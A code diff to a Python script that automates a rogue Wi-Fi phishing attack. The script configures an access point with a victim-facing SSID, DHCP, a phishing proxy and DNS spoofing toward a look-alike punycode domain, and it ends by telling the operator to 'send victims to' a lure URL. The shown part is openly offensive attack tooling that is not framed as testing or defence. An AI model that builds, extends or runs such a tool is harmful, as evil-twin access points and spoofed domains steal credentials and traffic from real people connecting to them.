@@ -160,7 +160,7 @@ def write_hosts(domain_puny, subs):
     return ordered
 
 
-def write_pulp(interface, interface_net, domain_puny, lure_url):
+def write_pulp(interface, interface_net, ssid, domain_puny, lure_url):
     """The wp3 script: AP, DHCP class B, phishkin3 proxy, DNS spoof.
 
     interface_net is the adapter with internet (wlan0 usually). phishkin3 needs
@@ -171,6 +171,8 @@ def write_pulp(interface, interface_net, domain_puny, lure_url):
     lines = [
         "set interface %s" % interface,
     ]
+    if ssid:
+        lines.append("set ssid %s" % ssid)
     if interface_net:
         lines.append("set interface_net %s" % interface_net)
     lines += [
@@ -224,6 +226,7 @@ def main():
     ap.add_argument("--domain", required=True,
                     help="fake look-alike domain, never the real one")
     ap.add_argument("--interface", default="wlan1")
+    ap.add_argument("--ssid", default="", help="AP name the victim sees")
     ap.add_argument("--interface-net", default="",
                     help="adapter with internet, shared to victims (e.g. wlan0)")
     ap.add_argument("--start", action="store_true",
@@ -264,7 +267,8 @@ def main():
         return
 
     write_hosts(domain_puny, subs)
-    write_pulp(args.interface, args.interface_net, domain_puny, lure_url)
+    write_pulp(args.interface, args.interface_net, args.ssid,
+               domain_puny, lure_url)
     start_in_tmux(args.interface)
     say("")
     say("attack running. Send victims to: %s" % lure_url)
